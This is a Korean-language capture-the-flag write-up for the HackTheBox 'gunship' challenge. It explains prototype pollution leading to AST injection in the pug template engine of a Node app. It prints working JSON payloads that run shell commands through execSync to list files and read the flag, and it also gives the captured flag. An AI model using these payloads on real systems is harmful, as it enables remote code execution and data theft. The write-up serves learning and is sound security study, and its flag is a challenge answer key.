# gunship
![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)

![image](https://github.com/user-attachments/assets/a37cca9a-47ce-4c0a-bd1f-e123b1299067)
- 해당 페이지의 입력폼이다.
- 해당 입력폼 작성시 아래와 같이 리퀘스트가 전송된다.
```
POST /api/submit HTTP/1.1
 Host: 159.65.20.166:31605
 Content-Length: 24
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/53
 Content-Type: application/json
 Accept: */*
 Origin: http://159.65.20.166:31605
 Referer: http://159.65.20.166:31605/
 Accept-Encoding: gzip, deflate, br
 Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
 Connection: close
 {"artist.name":"asfasf"}
```

## Source Code Analysis
```
# Generate random flag filename
FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
mv /app/flag /app/flag$FLAG
```
- ```entrypoint.sh```의 내용은 위와 같다. 랜덤으로 문자열이 붙기 때문에 flag 파일의 이름을 알아내야 한다.

```
 router.post('/api/submit', (req, res) => {
   console.log(req.body)
   const { artist } = unflatten(req.body);
   console.log(artist)
   if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
     return res.json({
       'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
     });
   } else {
     return res.json({
       'response': 'Please provide us with the full name of an existing member.'
     });
   }
 });
```
- ```/api/submit```엔드포인트 소스코드이다. ```artist.name```에 특정 문자열이 포함되어 있어야 ```pug.compile()```이 실행된다는 것을 알 수 있다.
- ```pug```모듈 관련 취약점을 탐색하다 보니 ```Prototype Pollution```을 활용한 AST injection 공격이 가능하다는것을 확인하였고, 해당 취약점 관련 PoC도 함께 찾을수 있었다.
```
"__proto__.block": {
   "type": "Text", 
  "line": "process.mainModule.require('child_process').execSync('$(ls | grep flag)')"
 }
```
- 페이로드의 내용은 위와 같다. ```__proto__.block```과 ```Text``` 타입을 사용

```
switch (ast.type) {
 case 'NamedBlock':
 case 'Block':
   ast.nodes = walkAndMergeNodes(ast.nodes);
   break;
 case 'Case':
 case 'Filter':
 case 'Mixin':
 case 'Tag':
 case 'InterpolatedTag':
 case 'When':
 case 'Code':
 case 'While':
   if (ast.block) {
        ast.block = walkAST(ast.block, before, after, options);
   }
 break;
```
- 해당 코드는 파싱을 담당하는 pug-walk/index.js의 소스 일부분이다.
- ```ast.block```의 값에 따라 ```walkAST()```가 호출되어 재귀적으로 구문 분석이 이루어진다는 것을 알 수 있다.
- ```ast``` 객체는 AST의 현재 노드(Abstract Syntax Tree)를 나타낸다.
- 또한 ```ast.block```은 초기화되지 않은 상태, 따라서 ```Prototype Pollution``` 공격을 통해 block을 오염시키면 공격코드가 구문 분석되는 것이다.

## PoC
```
{
  "artist.name":"Haigh","__proto__.block": {
  "type": "Text",
  "line": "process.mainModule.require('child_process').execSync('$(ls | grep flag)')"
  }
}
```
- 명령이 에러 없이 실행되면 결과를 볼 수 없기 때문에 ```$()```를 추가

```
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Command failed: $(ls | grep flag)<br>/bin/sh: flagzxQu2: not found<br> on line 1<br> &nbsp; &nbsp;at checkExecSy
</body>
</html>
```
- 에러메시지로 플래그 파일의 이름이 ```flagzxQu2```라는 것을 알 수 있다.

```
{
  "artist.name":"Haigh","__proto__.block":{
  "type": "Text",
  "line": "process.mainModule.require('child_process').execSync('$(cat flagzxQu2)')"
  }
}
```
- 마찬가지로 에러를 발생시켜 출력값 확인

```
 HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}
```
